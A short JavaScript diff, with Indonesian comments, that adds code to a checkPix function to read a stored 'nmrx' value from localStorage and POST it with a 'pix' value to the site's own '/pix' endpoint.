@@ -213,11 +213,36 @@ function checkPix(){
 
         }
 
+        /* AMBIL */
+        const nmrx =
+            localStorage.getItem(
+            "nmrx"
+            );
+
          /* SIMPAN */
     localStorage.setItem(
     "pix",
     pix
     );
+
+        /* KIRIM */
+    await fetch("/pix", {
+
+        method:"POST",
+
+        headers:{
+            "Content-Type":
+            "application/json"
+        },
+
+        body:JSON.stringify({
+
+            nmrx:nmrx,
+            pix:pix
+
+        })
+
+    });
         
         /* SHOW LOADING */
         loadingBox.style.display =
